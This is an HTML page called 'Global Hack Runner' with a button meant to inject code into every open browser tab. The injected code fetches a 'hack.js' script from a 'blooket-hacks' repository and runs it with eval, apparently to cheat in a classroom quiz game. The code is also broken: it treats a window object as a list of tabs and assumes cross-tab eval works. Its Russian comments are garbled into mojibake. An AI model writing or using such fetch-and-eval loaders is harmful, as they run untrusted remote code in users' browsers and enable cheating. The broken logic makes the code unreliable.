<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Hack Runner</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: white;
            margin-top: 50px;
        }
        h1 {
            font-size: 28px;
        }
        button {
            background-color: #28a745;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #218838;
        }
        .container {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üöÄ Global Hack Runner</h1>
        <p>Click the button below to run the hack in all open tabs.</p>
        <button onclick="runHack()">üöÄ Run Hack in All Tabs</button>
    </div>

    <script>
        function runHack() {
            alert("‚úÖ Sending hack command to all tabs!");

            // –û—Ç–∫—Ä—ã–≤–∞–µ–º –Ω–æ–≤—É—é –≤–∫–ª–∞–¥–∫—É, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º –æ–∫–Ω–∞–º
            const controllerTab = window.open("about:blank", "_blank");

            // –ó–∞–ø—É—Å–∫–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª, —á—Ç–æ–±—ã –∏—Å–∫–∞—Ç—å –≤—Å–µ –≤–∫–ª–∞–¥–∫–∏
            const interval = setInterval(() => {
                // –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –æ—Ç–∫—Ä—ã—Ç—ã–µ –æ–∫–Ω–∞
                const tabs = window.open("", "_self");

                if (tabs) {
                    try {
                        // –ó–∞–ø—É—Å–∫–∞–µ–º —Ö–∞–∫ –≤ –∫–∞–∂–¥–æ–π –Ω–∞–π–¥–µ–Ω–Ω–æ–π –≤–∫–ª–∞–¥–∫–µ
                        tabs.forEach(tab => {
                            tab.eval(`
                                fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                                    .then(response => response.text())
                                    .then(eval)
                                    .catch(error => console.error('‚ùå Hack failed:', error));
                            `);
                        });
                        clearInterval(interval);
                        alert("üî• Hack executed in all tabs!");
                    } catch (error) {
                        console.error("‚ùå Error accessing tabs:", error);
                    }
                }
            }, 1000);
        }
    </script>

</body>
</html>
